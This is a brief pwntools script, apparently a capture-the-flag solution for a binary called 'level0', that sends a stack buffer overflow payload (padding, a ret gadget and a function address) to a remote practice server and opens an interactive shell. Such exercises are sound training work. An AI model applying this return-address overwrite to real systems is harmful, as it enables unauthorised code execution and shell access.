from pwn import *

#io = process('./level0')
io = remote('node4.buuoj.cn',25643)

io.recv()

ret_addr = 0x4005A5
key_fun = 0x400596

payload = cyclic(0x80+8) + p64(ret_addr) + p64(key_fun)

io.send(payload)
io.interactive()
